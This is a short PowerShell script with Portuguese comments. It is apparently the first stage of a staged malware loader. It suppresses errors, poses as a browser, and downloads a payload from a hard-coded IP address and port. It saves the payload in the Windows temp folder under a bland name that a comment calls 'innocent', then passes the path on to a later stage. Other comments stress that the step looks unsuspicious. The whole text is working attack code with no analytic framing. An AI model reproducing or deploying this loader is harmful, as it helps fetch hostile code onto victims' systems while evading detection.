# =============================================================================
# STAGE 1 - DOWNLOAD
# =============================================================================
# Esta etapa apenas baixa o arquivo do servidor
# Nada suspeito: e um simples download
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"

$url = "http://45.146.81.89:5055/download/latest"
$tempPath = "$env:TEMP\sysdata.tmp"

try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $data = $wc.DownloadData($url)
    
    if ($data.Length -eq 0) {
        exit 1
    }
    
    # Salva como arquivo "inocente"
    [IO.File]::WriteAllBytes($tempPath, $data)
    
    # Retorna caminho para proxima etapa
    Write-Output $tempPath
    
} catch {
    exit 1
}
